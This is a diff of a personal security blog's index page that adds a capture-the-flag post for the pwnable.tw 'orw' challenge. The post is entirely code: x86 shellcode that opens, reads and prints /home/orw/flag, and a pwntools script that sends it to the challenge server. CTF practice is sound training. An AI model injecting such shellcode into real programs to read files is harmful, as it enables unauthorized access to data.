@@ -9,9 +9,13 @@
   <meta name="author" content="Bang">
 
   
-  <meta name="description" content="s89162504@ubuntu:~/pwn/pwn.tw/start$
-objdump -d -M intel ./start ./start:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386 Disassembly
-of section . &hellip;">
+  <meta name="description" content="push 0x00 push
+0x67616c66 push
+0x2f77726f push
+0x2f656d6f push
+0x682f2f2f mov eax,5 mov
+ebx,esp mov ecx,0 mov edx,0 int 0x80 mov
+ebx,eax mov eax,3 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +71,173 @@ of section . &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2018/08/24/pwnable-dot-tw-orw/">[pwnable.tw] Orw</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-08-24T17:06:35+08:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2018</span></span> <span class='time'>5:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><br /></p>
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push 0x00<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x67616c66<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x2f77726f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x2f656d6f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x682f2f2f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,5<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ebx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov ecx,0<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov edx,0<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ebx,eax<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,3<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+edx,50<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,4<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov ebx,1<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+edx,50<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">from pwn
+import *<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r =
+remote('chall.pwnable.tw',10001)<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r.send("\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\xB8\x05\x00\x00\x00\x89\xE3\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80")<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r.interactive()<o:p></o:p></span></div>
+
+
+<p><br /></p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -553,6 +724,10 @@ think I know what a file descriptor is!!<o:p></o:p></span></div>
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/24/pwnable-dot-tw-orw/">[pwnable.tw] Orw</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2018/08/24/pwnable-dot-tw-start/">[pwnable.tw] Start</a>
